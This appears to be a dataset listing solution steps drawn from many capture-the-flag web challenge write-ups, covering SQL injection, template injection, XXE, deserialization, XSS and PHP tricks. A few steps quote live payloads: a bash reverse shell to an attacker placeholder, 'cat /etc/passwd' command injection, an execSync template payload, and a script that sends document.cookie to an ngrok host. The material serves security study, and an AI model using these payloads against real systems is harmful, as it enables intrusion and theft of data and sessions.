[
    "Realized the page contained some secret potentially usable code.",
    "Used 'php://filter' to view the source of 'checkpass.php'.",
    "Used 'php://filter' again.",
    "Printed the flag.",
    "Study server.js",
    "Note that '.' and 'js' need to be the last two elements of the array",
    "Note that this arrangement is necessary to pass the file type check",
    "Analyze the secure portal page source",
    "Decipher that the JavaScript in the source code was obfuscated",
    "Understand many calls to 'window' were made in the CheckPassword function",
    "Realize the calls to 'window' essentially represent 'window.localStorage.setItem'",
    "Realize it is similar to 'window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]]'",
    "Extract the first character of the password",
    "Inject similar code into the input box",
    "Update the prefix",
    "Analyze the server script running at the provided URL.",
    "Discover the variable name 'application' linked to the tornado.web.Application object.",
    "Run the server script with a new payload '?icecream={{application.settings[\"cookie_secret\"]}}'.",
    "Reload the server script.",
    "Review the given PHP code.",
    "Understand what the code does.",
    "Identify that the '$hash' and the '$target' are matched using '==' instead of '==='.",
    "Understand that this makes the match vulnerable to type juggling.",
    "Realize the role of type juggling in this matching process.",
    "Select any one of the identified hashes.",
    "Noted the use of the 'flask_caching' module for the app",
    "Learned about python pickles",
    "Created a payload using python pickle containing a command execution statement",
    "Read the just created payload",
    "Triggered the command execution on the server side",
    "Analyze a Python script.",
    "Identify the source code of the application.",
    "Identify the specific line of code related to the command line subprocess interaction.",
    "Identify the critical line.",
    "Choose the '-vf drawtext=...' option within the 'ffmpeg' command as the method of exploitation.",
    "Intend to inject a 'grep' command to look for the flag in the main.py file.",
    "Formulate the payload in the format 'csictf.gif' -vf drawtext=\\\"text=$(grep ffLaG main.py)\\\"'.gif'.",
    "Access the website's source code",
    "Search for the function addCaptcha() in the JavaScript code",
    "Identify the functionality of the addCaptcha() function",
    "Open the function addCaptcha() in the devtools",
    "Locate the loop() function within addCaptcha()",
    "Remove the loop() function from addCaptcha()",
    "Access the JavaScript console in the devtools",
    "Call the addCaptcha() function",
    "Repeat the previous substep 4 more times",
    "Define conditional statement",
    "Initialize certain variables with specific values if challenge is 'taxi union'",
    "Enter while loop",
    "Iterate over every character in the domain",
    "Build up the 'payload'",
    "Create 'payload' in the format of a SQL statement",
    "If it is not, continue loop with next character",
    "Implemented a logic that changes the cookie flag each time a request is made",
    "Set 'EOF' as the termination condition of the script",
    "The author sets a condition to set the parameters based on the specific challenge.",
    "The condition to receive the CTF password (flag) is checked.",
    "If the condition is not met, the script continues iterating.",
    "The characters from the 'domain' are progressively appended to the payload.",
    "The 'flag' value updates with the successful character.",
    "The process is repeated until the end of the flag is found.",
    "Analyzed the source code of the web application",
    "Noticed that the output in the /login POST route has not been stringified",
    "Understood how objects are handled",
    "This makes password an object",
    "Climb the Python MRO hierarchy.",
    "List all usable classes.",
    "Find the 'subprocess.Popen' class.",
    "Identify the JS file 'jquery.jscroll2.js'.",
    "Open 'line 1' of the 'jquery.jscroll2.js' JS file.",
    "Create a Python script to convert the hexadecimal values in the line to strings.",
    "Analyze the functionality of the converted code snippet.",
    "Recognize that the function for generating a token is using string interpolation to inject variables directly into the token string.",
    "Look at the JavaScript file in the webpage.",
    "Observe that the JavaScript code prevents 'script' tags.",
    "Observe that only certain attributes are allowed for an element in the JavaScript code.",
    "View the homepage source",
    "Identify a comment prompting the user to 'get the page'",
    "Include code in 'payload.php' to list all directory files",
    "Use the uploaded PHP file for the request",
    "Open source code of the webpage",
    "Analyze JwtService.java.",
    "Analyze SecretGenerator.Java.",
    "Navigate to the 'controllers' directory.",
    "Examine the file UserController.java to identify any useful endpoints.",
    "Noticed the tag `XXE` indicating `XML external entity`.",
    "Noticed two javascript files: 'detailsCheck.js' and 'xmlDetailsCheckPayload.js'.",
    "Concluded that the challenge involves XML External Entity (XXE) from the use of the `XXE` tag and the 'xmlDetailsCheckPayload.js' file.",
    "Examined the request format in the 'Network' tab of the developer tools.",
    "Conduct experiments with different content.",
    "Discover the smarty-4.0.1 PHP library.",
    "Discover the templates_c folder.",
    "Use a payload to leak the source code of PHP.",
    "Discover the flag within the source code.",
    "Found a snippet of JavaScript code containing database credentials and a 'JSESSIONID' cookie.",
    "Examined the source code of the challenge present in the cloned repository.",
    "Examined the contents of the downloaded code",
    "Attempted to start the app locally with 'npm run start'",
    "Examined server code",
    "Discovered the line 'const port = process.env.PORT || 80'",
    "Examined the application's source code",
    "Examined the 'index.js' file",
    "Examined the 'login.js' file",
    "Examined the 'logout.js' file",
    "Examined the 'signup.js' file",
    "Identified the 'unserialize()' function",
    "Determined that the function is used in the index route",
    "Created a test JavaScript file",
    "Executed the payload using the 'unserialize()' function",
    "Included code in the payload to return the flag as the username",
    "Download the source code.",
    "Identify the app as a Node.js app.",
    "Identify the app as a TypeScript app.",
    "Identify the app as written with Next JS.",
    "Spot the 'auth.ts' file.",
    "Identify a handler function within the file.",
    "Fail due to the site removing <script> tags.",
    "Decide to examine the source code.",
    "Use an Integrated Development Environment (IDE) for examination.",
    "Identify suspicious JavaScript named 'mec-frontend'.",
    "Noticed command execution based on the URL parameter, 'host'.",
    "Set 'host' parameter in URL to '127.0.0.1;cat /etc/passwd'.",
    "Used 'bash -i >& /dev/tcp/<ATTACKER-IP>/<ATTACKER-PORT> 0>&1' as a command.",
    "Attempts to open a reverse shell modified the PHP file.",
    "Observe that Baby Eval is a Node app.",
    "Analyze the source codes provided.",
    "Determine that the webpage is created by executing an eval from a payload query parameter or calling the directory() function.",
    "Discover that the code uses a blacklist Regex.",
    "Find a JavaScript feature called Template Literals.",
    "Realize that Template Literals can be used to call functions without parentheses.",
    "Write a payload using the Template Literal method.",
    "Directly call the directory function with 'flag' as its parameter.",
    "Conclude that the directory function receives an array with a single string 'flag' as an argument.",
    "Understand that by the function's design, it returns the value of the 'flag' environment variable.",
    "Understand the 'vsCAPTCHA' app.",
    "Interpret that 'b1' is initialized with a random number from 0-500.",
    "Interpret that 'b2' is initialized with a random number from 0-500.",
    "Attempt to refactor the code.",
    "Limit the try range.",
    "Observed output similar to standard Linux commands.",
    "Viewed source code and observed 'shell_exec' usage with 'santa_mon.sh' script.",
    "Recognized input appending pattern to '/santa_mon.sh'.",
    "Noticed the 'sanitize' function removes spaces from input.",
    "Examined source code of 'santa_mon.sh' program.",
    "Noted execution of argument as command.",
    "Checked output of 'List Processes' command and identified 'python3 /root/ups_manager.py'.",
    "Reviewed source code of 'config/ups_manager.py' revealing the HTTP server with endpoints for 'ups_status', 'restart_ups', and '/get_flag'.",
    "Enclosed payload in double quotes for PHP.",
    "Examine the source code.",
    "Identify that 'RS256' and 'HS256' algorithms are allowed for decryption in 'challenge/helpers/JWTHelper.js'.",
    "Inspect 'challenge/routes/index.js' file for SSTI vulnerability.",
    "Inspect 'challenge/helpers/CardHelper.js' file for SSTI vulnerability.",
    "Craft and insert the payload '{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('cat /flag*')\")()}}' into the exploit.",
    "Inspect the source code of the website.",
    "Review the source code in `database.sql` file again.",
    "Inspect the `challenge/routes/index.js` file.",
    "Reinspect the source code with attention to the user authentication process.",
    "Examine the 'challenge/index.js' file in the source code zip.",
    "Examine the 'challenge/routes/index.js' file. We find an '/api/submit' endpoint which the frontend sends user data.",
    "Inspect 'challenge/bot.js' to understand 'bot.readQueries(db)' function. It reveals that the bot imports puppeteer, a headless browser controlled via JavaScript, holds the flag, loads the application home page, sets the 'flag' cookie, visits the '/queries' endpoint, and then exits.",
    "A Python Flask application, does this in 'xss-cookie-stealer.py'. This script defines one route, '/', which reads the 'c' parameter in the request URL, opens a file called 'cookies.txt', writes the contents of 'c' parameter to that file, and then redirects to 'https://google.com'.",
    "Input your ngrok URL into the malicious payload. For example, if ngrok URL is 'http://92832de0.ngrok.io', then the payload should be '<script>document.location='http://92832de0.ngrok.io?c='+document.cookie;</script>'",
    "Discover it is running on Flask.",
    "Review the input form logic.",
    "Notice the use of Python's eval() function.",
    "Identify that eval() function is vulnerable.",
    "Realize it can be used to execute shell commands from within Python.",
    "Find the source code file 'flagchecker.c' in the repo",
    "Analyze the source code of 'flagchecker.c'",
    "Explore other files in the repo",
    "Locate the file 'build_flag_checker.yml'",
    "Analyze the contents of 'build_flag_checker.yml'",
    "Open the 'build.sh' script referenced in the GitHub Actions file",
    "Identify the 1st command-line argument used as a value assigned to a macro",
    "Open the 'flaghash.sh' script",
    "Analyze the process in the script: making a cURL request, hashing the results with MD5, and setting the 'auth' cookie to the value of 'FLAG_AUTH' from secrets",
    "Investigate the GitHub Actions workflow runs",
    "Investigate changes made in the 'Fix auth!!!' commit",
    "Inspect the source HTML.",
    "Use the LaTeX function \\StrMid to isolate the '/' symbol.",
    "Write a LaTeX script.",
    "Define sections of the path to the flag.",
    "Read index.html.",
    "Isolate the '/' character.",
    "Build the path to the flag.",
    "Ensure that `$to_check` is assigned the value `0`.",
    "Perform XOR operation between the uploaded file and `cipher + 0xd34db33f`.",
    "Check if the XOR result is zero.",
    "The if statement evaluates to true.",
    "Examine the render function",
    "Determine that template injection is possible",
    "View the HTML source code of the website",
    "Search for comments within the style.css file",
    "Identify the second part of the flag within a comment",
    "Inspect website's code.",
    "Locate and open the JavaScript file",
    "Find the desired location in the JavaScript file",
    "Examined the website's '.git' folder",
    "Inspected the 'flag.php' file and its history",
    "Analyzed the source code for potential flaws",
    "Realized the asserts in 'index.php' were in strings",
    "Indicated potential 'eval' being done on the string",
    "Used the page string as '' and die(show_source('templates/flag.php')) or ''",
    "Caused the source of 'flag.php' file to be revealed",
    "Acknowledged that one should never let user input be 'eval'ed in any way",
    "Identify the vulnerable 'report' admin page",
    "Use a backslash as username",
    "Use LFI to access the code of the 'flag' resource in the 'deleted' folder",
    "Search for the source code of the web application",
    "Determine the technology stack of the web application",
    "Verify that the web application is using node.js",
    "Realize that the system should have a `package.json` file",
    "Research the hashpumpy function",
    "Apply the hashpumpy function to retrieve the contents of package.json",
    "Inspect the User.js file",
    "Discover the usage of `node-serialize` in User.js",
    "Examine the `decrypter` function",
    "Note the usage of the `unserialize` function",
    "Determine that the code has a vulnerable functionality.",
    "Examine the 'init_db' function.",
    "Study the given codes on the page which are written in PHP.",
    "Identify that the code is reading an HTTP header.",
    "From the PHP, realize that there\u2019s a potential path traversal vulnerability.",
    "Understand that '../' is replaced in the code.",
    "Analyze the provided Python server script.",
    "Identify the first function that sets specific server response headers if the request is 127.0.0.1.",
    "Extract the main execution function from the Python script.",
    "Note that 'Content-Type' is strictly checked in the header-setting function.",
    "Identify that '.jpg', '.png', and '.gif' extensions are blacklisted in the header-setting function.",
    "Select 'img/paperbots.svg' from the images provided by the server.",
    "Analyse the response of the authentication API",
    "Notice that the 'magic code' is present",
    "Identify that the 'magic code' is present in the payload returned by the server",
    "Study the downloaded source code.",
    "Find the code in 'view.php'.",
    "Understand that the code retrieves a note.",
    "Understand that the program only casts the integer part of 'id'.",
    "Confirm the first 'if' statement would be passed.",
    "Confirm the second 'if' statement would be passed.",
    "Understand that PHP only considers the integer part of 'id' for the cast.",
    "Ensure the 'file_get_contents' instruction is used.",
    "Construct the backend endpoint as '$BACKEND/get/5779715767432985082/../../admin'.",
    "Realize the endpoint changes to '$BACKEND/admin'.",
    "Observe a PHP snippet",
    "Analyze the PHP code for potential vulnerabilities",
    "Determine irrelevance of the first 'If' statement",
    "Use the same value for 'pass' URL parameter and User-Agent",
    "Approach the third 'If' statement",
    "Deduce the possible range of the value of $_[0]",
    "Identify 'b' as the character that successfully returns the flag",
    "Checked the source code of the homepage",
    "Checked the source code of the 'd4rks0c1ety' page",
    "Found the second part of the flag '_th1s_w3bs1t3}' in an HTML comment",
    "Visited the reported portion of the JavaScript file.",
    "Found the flag 'accessdenied{1t_w4s_h1dd3n_h3r3_594a9sd}' in the JavaScript file.",
    "Notice a strange message of INSTRUO team's love for cookies.",
    "Analyze the obfuscated front-end source code.",
    "Identify element and class names within the code.",
    "Associate recognized components with their intended functionalities.",
    "Examine the provided back-end source code.",
    "Implement logic to determine the winning position.",
    "Utilize the requests library in Python for communication.",
    "Code the script to play the game repeatedly.",
    "Analyze the file named apache_ctf.conf.",
    "Identify the rule within the configuration file.",
    "Explored the HTML source of the webpage.",
    "Discovered a treasury.js file in the HTML source.",
    "Determined that the treasury.js file can help understand the actions performed on the site.",
    "Considered the hint provided into the <flag> element talking about a '/flag' file.",
    "Used a 'UNION' operation for the SQL injection.",
    "Used PHP filters.",
    "View the source code.",
    "Examine the source code.",
    "Search for 'eval' syntax.",
    "Identify 'eval' syntax on 'warmup' GET parameter.",
    "Implement bitwise XOR operation in PHP to bypass checks.",
    "Ensure the payload commands execution of another GET parameter.",
    "Ensure the payload visualizes and reads contents of 'flag.php'.",
    "Break down the payload.",
    "First part constructs a string representation.",
    "Second part performs 'file_get_contents('flag.php').",
    "Final part performs variable dump (var_dump($_0)).",
    "Discover a JavaScript script in the HTML.",
    "Access the obfuscated code at http://challenges.auctf.com:30022/authentication.js.",
    "Connect to 'scriptlet' endpoint",
    "Reveal running as 'www-data'",
    "Enumerate root directory",
    "Reveal the flag",
    "Discovered that the website is using PHP eval() function.",
    "Printed the content of the index.php file.",
    "Discovered the flag within the content of the index.php file.",
    "Determine that the website is using PHP eval() function",
    "Retrieve content of index.php file",
    "Search for the flag within the content of the index.php file",
    "Understood that the variable part contained the previous char of the flag.",
    "Understood that the variable part contained the actual char of the flag.",
    "Understood that the variable part contained the index of the actual char.",
    "Implemented a loop in the Python script.",
    "Script iteratively reads the transmissions.",
    "Created another loop in the Python script.",
    "Iteratively added a character to the flag.",
    "Checking if the character's index matches the desired one.",
    "The script printed out the flag after successful execution.",
    "Found that 'POST' and 'PUT' returned a different result.",
    "Received a PNG image with a crossword puzzle from the '/square/' endpoint.",
    "Put together all obtained parts of the flag.",
    "Combined both parts of the flag to solve the challenge.",
    "Revealed that a 'vim' command must be used.",
    "Combined both parts of the flag.",
    "View PHP source code",
    "Examine the script",
    "Realize the issue in the comparison",
    "Identify the type juggling scenario",
    "Note the comparison $session_data['hash'] != strtoupper(MD5($cfg_pass))",
    "Execute the Python script",
    "Observed that the web application uses PhantomJS/2.1.1",
    "Used the knowledge of the vulnerability to conclude that the web application potentially parses the HTML content and interpret it",
    "Created an XML HTTP request that references the /etc/flag.txt directory",
    "Identified that the underpinning technology of the web application is PhantomJS/2.1.1.",
    "Applied the knowledge of the discovered vulnerability to infer certain characteristics of the web application.",
    "Concluded that the web application may interpret HTML content, thus implying a potential for Cross-site Scripting (XSS).",
    "Inject a template operation (7*7)",
    "Verify if the injected template operation (7*7) triggers the SSTI vulnerability",
    "Test the character '%'",
    "Test the character '['",
    "Test the character ']'",
    "Test the character '\"'",
    "Test the character '+'",
    "Test the character '_'",
    "Check if any of the tested characters bypass the template engine",
    "Find the required (subprocess.Popen) class among the identified subclasses",
    "Determine the position of the (subprocess.Popen) class, which is 407",
    "Use the identified class (subprocess.Popen) to execute the 'id' command",
    "Observe the PHP code of the website",
    "Notice that the site's PHP code allows for the crafting of 'preg_replace'",
    "Discover that 'preg_replace' is vulnerable to RCE (Remote Code Execution) using '/e'",
    "Trigger phpinfo() output by visiting 'http://easy-php.darkarmy.xyz/?bruh=phpinfo()&nic3=/DarkCON/e'",
    "Discover that the 'is_payload_danger' method prevents certain functions such as 'system'",
    "Use the 'fread' and 'fopen' functions to craft a payload to read 'config.php'",
    "Visit 'http://easy-php.darkarmy.xyz/?bruh=base64_encode(fread(fopen($_GET[%27pwn%27],%27r%27),512))&nic3=/DarkCON/e&pwn=config.php'",
    "Reveal the source code of 'config.php'",
    "Identify the presence of a Git repository in the target URL (http://meme-stash.darkarmy.xyz/).",
    "Extract all the contents of the Git repository from the website.",
    "Inspect the 'git log'.",
    "View all previous commits in the repository.",
    "Identify a suspicious commit with a message 'oops'.",
    "Check differences between the suspicious commit and its preceding commit.",
    "Recognize the presence of a file named 'flag.jpg'.",
    "Find a comment containing PHP code to upload a file",
    "Note that the PHP code renames the uploaded file with a random name while preserving the file extension",
    "Run the PHP shell",
    "Add phpinfo() to the code in the PHP shell",
    "Get information about the PHP configuration",
    "Notice that the PHP configuration has several functions disabled",
    "Note that 'scandir' and 'file_get_contents' are not disabled",
    "Write a new PHP exploit",
    "Use 'scandir' and 'file_get_contents' to browse through files in the '/etc' directory",
    "Create the new PHP exploit",
    "Examined the HTML source code of the page.",
    "Implemented an error-based approach.",
    "Received an XPATH syntax error.",
    "Understand from the description that an XML External Entity (XXE) vulnerability might be involved",
    "Website parses the XML",
    "Website evaluates the 'xxe' entity",
    "Checked the PHP source code.",
    "Identified the need for a 'GET' request with two parameters having the same md5 hash.",
    "Understood from the code snippet that the md5 hash must collide.",
    "Used 'hex2bin' PHP function.",
    "Converted the hexadecimal values into binary data.",
    "Identified the received flag.",
    "Analyze the HTML code of the page",
    "Analyze the HTML for possible vulnerabilities.",
    "Discover a JavaScript code that copies the email value to the username field.",
    "Intercept the Post Request in the JavaScript code.",
    "Retrieve the flag from the response page.",
    "Inspect the source code of the website",
    "Inspect the source code of the webpage",
    "Identify the JavaScript event in the onclick attribute",
    "Identify that the JavaScript check prevents submission of long passwords.",
    "Bypass the JavaScript check.",
    "Observe that remote shell functionality is blocked due to 'seccomp' filter preventing 'execve'.",
    "Spot '@login_required' annotations as indicators.",
    "Find the endpoint '/dogooo/user/create' for creating new users.",
    "Locate the 'get_comments' function within the [loaddata.py](loaddata.py) file.",
    "Identify the code snippet that prints 'self.__dict__' in specific conditions.",
    "Conditions: Comment text contains a format string like '{rating}'.",
    "Verify that the post content is printed with 'self.__dict__' in the preview of the webpage.",
    "Utilize the '{rating[comments][0].__class__.__init__.__globals__}' format string.",
    "Access 'globals' objects using the format string.",
    "Locate the 'login' method in [dogooo_comments.py](dogooo_comments.py) file.",
    "Identify the usage of Python 3's f-Strings functionality in the 'login' method.",
    "Note that f-Strings can be used to call methods.",
    "Note the usage of the 'f()' method on the 'username' field.",
    "Analyzed the provided files.",
    "Confirmed no intentional vulnerabilities within the files.",
    "Identify the PHP source code provided that includes a User Submitted file inclusion vulnerability",
    "Analyzed the source code of the app provided in the challenge.",
    "Found that there were no escaping countermeasures for the ':' character.",
    "Analyzed given PHP script to understand the functionality of different methods.",
    "Inferred that the 'config.php' file must be printed via curl execution.",
    "Understood that to trigger curl execution, 'doit' method must be invoked.",
    "Noted that the 'doit' method is called in the '__destruct()' function.",
    "Understood the conditions for the 'doit' method being called, specifically if present in the '$method' attribute of the destructed object.",
    "Planned to craft an object with desired parameters.",
    "Created a PHP script to serialize an object for the exploit.",
    "Adjusted the '$method' attribute in the serialized object.",
    "Set the '$method' attribute in the serialized object to be 'doit'.",
    "Recognized a known strange PHP behavior could be exploited to circumvent file extension checks.",
    "Accounted for the replace operation which changed the string length.",
    "Received flag 'F#{wtf_5trp0s_}' in response.",
    "Analyze HTML",
    "Connect to source code link",
    "Understand that exploitation involves creation of a Stored XSS",
    "Find that content of the note is reflected in the source code",
    "Note that the const 'note' can be altered",
    "Close the string and insert arbitrary JavaScript",
    "Manipulate the HTML structure",
    "Create an insertion point",
    "Inspect the HTML source code of the admin page",
    "Determine that the second part of the packet represents the post ID",
    "Inspect the client-side code",
    "Analyzed the client source code.",
    "Identified the flag to be 'rtcp{d0n't_g1ve_us3rs_db_a((3ss}'.",
    "Inspected the HTML source code.",
    "Inspected the source code of the newly accessed webpage.",
    "Recognized that the source code is written in PHP.",
    "Analyzed the PHP code in the source.",
    "Identified that the PHP code output the flag when a specific username 'flagman69' is used.",
    "Evaluated the PHP code to understand how user input is processed.",
    "Identified that the user input is directly concatenated to the SQL query ",
    "Observed the source code closely for additional checks or controls.",
    "Prepared an SQL injection using 'UNION' clause to search for 'flagman69' user.",
    "Used the gained information about the 'users' table structure to craft a new SQL injection.",
    "Analyze the HTML source code.",
    "Identify that the QR Code produced only contains the first character inserted.",
    "Use backticks to confirm remote code execution (RCE).",
    "Send the command `echo 'X'`.",
    "Write a Python script.",
    "Create a function `execute_command` in the Python script.",
    "Run commands and increase the command output slice index until the result was empty.",
    "Create a function `http_get` in the Python script.",
    "Get the response.",
    "Check if PNG was found in the response.",
    "Review the source code of the homepage.",
    "Recognize that the 'with' HTTP GET parameter can be manipulated.",
    "Replace the existing 'with' value, 'discord', with a different value, 'foo'.",
    "Replace the 'with' value with the word 'flag'.",
    "Review the presented source code",
    "Pass serialized input via 'id' HTTP GET parameter",
    "Pass through certain PHP code",
    "Identify additional server check constraints",
    "Research ways to bypass PHP constraints",
    "Introduce additional PHP code",
    "Call a specific function",
    "Inspect the source code of the website.",
    "Study the source code.",
    "Identify the checks for specific patterns.",
    "Determine which patterns will allow or block requests.",
    "Research if PHP manipulates input parameters' names.",
    "Look into how PHP removes whitespaces from input parameters' names.",
    "Investigate how PHP converts characters into underscores in input parameters' names.",
    "Write a PHP program.",
    "Check if characters are converted to underscores in the program.",
    "Identify the character from the script output.",
    "Analyze the remaining check in the source code.",
    "Research if 'ereg' instruction can be bypassed.",
    "Investigate if injecting a NULL byte can bypass the 'ereg' instruction.",
    "Inject a NULL byte into the final URL.",
    "Successfully bypass the checks in the source code.",
    "Capture the flag.",
    "Analyze the HTML source of the page.",
    "Find a commented item in the HTML source of the page.",
    "Receive HTML content suggesting Shellshock vulnerability.",
    "Identify potential for XSS due to unsanitized input field",
    "Identify potential for XSS due to unescaped output upon viewing uploaded documents",
    "Include a script to alert the document's cookies in the uploaded LaTeX document",
    "Discover an HTML comment about an unlinked source file",
    "Analyze the downloaded source code",
    "Discover a conditional statement in the source code",
    "Reveal a PHP serialized class",
    "Craft a malicious serialized class",
    "Realize that the submitted string is appended after the '$the_cow' variable in the script.",
    "Create a code snippet: `EOCA$eyes=`ls`;print '$eyes';`.",
    "Note that the 'A' placeholder in the code has to be replaced with `\\n (`0x0a`) in a proxy.",
    "Utilize the code snippet to list the directory content.",
    "Create another Perl code snippet.",
    "Take note of the returned JavaScript code",
    "Rewrite the JavaScript code",
    "Format the code in a more readable format",
    "Modify the previous code",
    "Print the reversed string",
    "Run the written JavaScript",
    "Observed an SQL query at the start of the HTML page returned.",
    "Determined that the result of the SQL query was used to populate the PHPSESSID cookie by analyzing the HTTP responses.",
    "Determined the user table and the number of columns that need to be unioned.",
    "Revealed the flag 'aj9dhAdf4'.",
    "Clone S3Scanner from GitHub repository",
    "Discovered the full flag one character at a time",
    "Combine the altered header, payload, and the generated signature.",
    "Understand vulnerability of upload functionality",
    "Insert PHP code into DocumentName",
    "Ensure the inserted PHP code can execute commands remotely",
    "Open the 'play.php' file",
    "Analyze the source code",
    "Analyze the query within the source code",
    "Confirm that the observed behavior indicates a Blind SQL Injection vulnerability",
    "Write a Python script",
    "Use the Python script to discover the token",
    "Locate a line of PHP code within error logs.",
    "Access the PHP environment file.",
    "Inspect the source code on the feedback form page.",
    "Discover that the feedback is sent via XML composed by JavaScript.",
    "Identify that the application is vulnerable to XXE.",
    "Recognize that the 'author' field can be used to execute the attack.",
    "Assess that remote code execution is not possible.",
    "Design the XML code to expose the flag file from the current working directory.",
    "Extract the flag from the response.",
    "Analyze the source files",
    "Identify that the vulnerability exists",
    "Reveal the flag",
    "Remove the first file created.",
    "Recover the missing source files using Bazaar's 'revert' command.",
    "Start searching each revision.",
    "Adjust script to identify differences made.",
    "Identify two distinct changes to the 'index.php' file.",
    "Identify the first change.",
    "Identify the second change.",
    "Replaced the current 'pack-names' file with the downloaded 'pack-names' file.",
    "Ran 'bzr check' command in the command line.",
    "Analyze the certificate.",
    "Loop through a range of integers.",
    "Check if the page content contains 'MCA{'.",
    "If the content contains 'MCA{', print the content.",
    "Break the loop.",
    "Run the script.",
    "Discover that the 'name' parameter uses PHP serialization",
    "Realize the execution of PHP code when reading a file through LFI",
    "Include a PHP command in the 'name' parameter",
    "The PHP command is to display the ID of the current process",
    "Use a basic SQL injection payload",
    "Modify the SQL injection query",
    "Run the script to retrieve the password for the flag: gigem{h0peYouScr1ptedTh1s}",
    "Realize that removing a portion of the 'counter' cookie triggers a zlib Input Error",
    "Recognize Java Serialization notation at the start of the base64 decoded string",
    "Determine the 'value' attribute is at the end of the Java serialized object",
    "Inject the base64 version of the bash script.",
    "Retrieve the flag from the decoded base64 response.",
    "Examine the page's source code.",
    "Find that the login process is performed via a JavaScript file (scripts/login.js).",
    "Analyze the JavaScript file.",
    "Discover a hardcoded password within the JavaScript file.",
    "Password found: 'I4m4M4st3rC0d3rH4x0rsB3w43'",
    "Analyze the webpage's HTML and JavaScript code.",
    "Note that messages were not being escaped.",
    "Trigger JavaScript code.",
    "Decide to discover each character of the password one at a time.",
    "Use the information obtained from the previous step.",
    "Examine the source code of the main web page.",
    "Realize that the endpoint `getimg.php` is vulnerable to Local File Inclusion (LFI), allowing files on the server to be read.",
    "Base64 encode the filenames `index.php` and `getimg.php`.",
    "Use the encoded filenames as parameter values for `getimg.php` to test the LFI vulnerability.",
    "Reveal the source code of both `index.php` and `getimg.php`.",
    "Use knowledge of local git repository structure to start pulling files from the server's .git directory.",
    "Examine the `.git/logs/HEAD` file.",
    "Use commit IDs to determine when the flag was removed from the source.",
    "Use the commit IDs to fetch further git objects from the server.",
    "Fail to restore source code due to missing git objects.",
    "Attempt to checkout the master branch.",
    "Fetch the missing git objects from the server.",
    "Encounter additional missing git objects.",
    "Fetch further missing git objects from the server.",
    "Successfully display the differences between the two git commits.",
    "Identify the specific JavaScript file",
    "Identify the specific JavaScript file",
    "Perform a test with an invalid productId value",
    "Recognize the vulnerability associated with the parameter being reflected in the response",
    "Determine successful exploitation of an XXE vulnerability",
    "Discover the usage of XML envelopes via two JavaScript files when buttons are pressed.",
    "Identify the Javascript file responsible for crafting the XML envelope.",
    "Identify the second Javascript file responsible for sending the XML envelope and reading the answer.",
    "Test the system's reaction by passing an invalid productId value.",
    "Analyzed the HTML source code.",
    "Understood how MySQL executes query portions inside comments.",
    "Retrieved the flag from the table content.",
    "Analyzed the HTML source code.",
    "Understood how MySQL executes query portions inside comments.",
    "Examined the HTML source code.",
    "Reviewed JavaScript 'index.js'.",
    "Noticed that each challenge string must be found every time it is called.",
    "Recognized the potential for optimization.",
    "Implemented a smart voter script.",
    "Ensured the script utilizes a previously saved cache.",
    "Minimized time spent on creating strings to match the server's challenge.",
    "Script was launched causing the browser to start the voting process.",
    "Analyse the HTML code.",
    "Review the provided Python code.",
    "Examine the Python code.",
    "Identify the debugging private key.",
    "Download the source code attached to the CTF challenge.",
    "Review the given source code, which is a Javascript calculator web app.",
    "Recognize this as a code injection challenge.",
    "Realize that the Javascript function can print itself, including comments, if its name is returned.",
    "Identify that the structure of the script can be seen as something like '(x, y)()'.",
    "Understand that you can convert a string to an array of chars in Javascript using the clause '[...p]'.",
    "Identify that the clause cannot be executed directly on 'p' as it 'is not iterable', and find a way to convert it to a string using concatenation.",
    "Analyzed the source code",
    "Inferred the challenge was to exploit the `theme` parameter to inject XSS",
    "Discovered a script on the `index.php` page",
    "Identified the script calling `api.php` endpoint",
    "Tried passing custom callback parameter to `api.php` endpoint",
    "Hit a snag due to restrictions of the `trustedTypes` policy of CSP",
    "Find the source code of the web app in the www.zip file.",
    "Identify the login process in the file bookhub/forms.user.py.",
    "Find that the get_remote_addr() function from the file bookhub/helper.py is used to get the user's IP address.",
    "Identify extra code for the debug mode in the file bookhub/views/user.py.",
    "Discover a bug in the /admin/system/refresh_session/ endpoint.",
    "Identify a potential redis injection flaw in the refresh_session() function.",
    "Notice that the user's sessionID is used in a redis eval() call with a lua script.",
    "Realize that the pickle python object could potentially be exploited for a pickle deserialization vulnerability.",
    "Analyze the source code of the page.",
    "Identify JavaScript functions that handle creation of iframe or appending script source.",
    "Identify a message event listener that conducts some checks on iframe data from URL.",
    "Notice a flaw in the check condition.",
    "Realize that the check should be for iframe value not being an object, not iframe itself.",
    "Have knowledge of a simple Web server written in Python",
    "The Web server handles only GET and POST requests with files",
    "Developed a suspicion of a directory traversal vulnerability",
    "The suspicion is related to either the GET path handling or the POST filename",
    "Confirmed the existence of a directory traversal vulnerability",
    "The vulnerability is present in the POST filename",
    "Made the decision to overwrite '.bashrc' file",
    "The objective is to overwrite '.bashrc' file with their payload",
    "Find an oddly-named nginx.conf file.",
    "Analyse the downloaded nginx.conf file.",
    "Reveal the '/admin' directory's contents.",
    "Find a potential Off-by-Slash bug.",
    "Identify that nginx concatenates alias directives with location directives.",
    "Identify that the challenge is a Cross-site Scripting (XSS) challenge.",
    "Analyze the source code of the webpage.",
    "Recognize that the 'Markdown' converter uses regex.",
    "Recognize that all open HTML tags '<' have been removed.",
    "Determine that the removal of open HTML tags '<' makes a traditional XSS attack impossible.",
    "Identify a specific replace function within the source code.",
    "Recognize that the specific replace function changes markdown format images into HTML image tags.",
    "Determine that the specific replace function does not sanitize the 'alt' parameter.",
    "Add a JavaScript event handler for the XSS attack.",
    "Examine the provided source code.",
    "Source code uses a markdown library to convert markdown into HTML.",
    "Source code runs DOMPurify.",
    "Source code performs some validation.",
    "Notice that DOMPurify is applied on HTML.",
    "Acknowledge that DOMPurify is pretty secure.",
    "The statement indicates that using the sanitized HTML with jQuery's insecure elm.html() method without the SAFE_FOR_JQUERY flag could lead to XSS.",
    "Recognize from the source code that it is using jQuery's html() method.",
    "Notice that the SAFE_FOR_JQUERY flag is not being used.",
    "Find a section in DOMPurify's unit tests.",
    "Test the payloads from the unit test in the challenge.",
    "Identify that the challenge is written using the mermaid library",
    "Attempt to inject code with an embedded script",
    "Identify the reason for the failure as JavaScript trying to parse parentheses",
    "Learn that backticks can be used instead of parentheses in JavaScript",
    "Replace parentheses with backticks in the script",
    "Reveal all the source code.",
    "Open the source.zip file.",
    "Find upload.php in the source.zip file.",
    "Perform an immutable code inspection of upload.php.",
    "Identify XML External Entity (XXE) vulnerability when loading SVG files.",
    "Identify serialization in the php code.",
    "Identify serialization in the __construct method.",
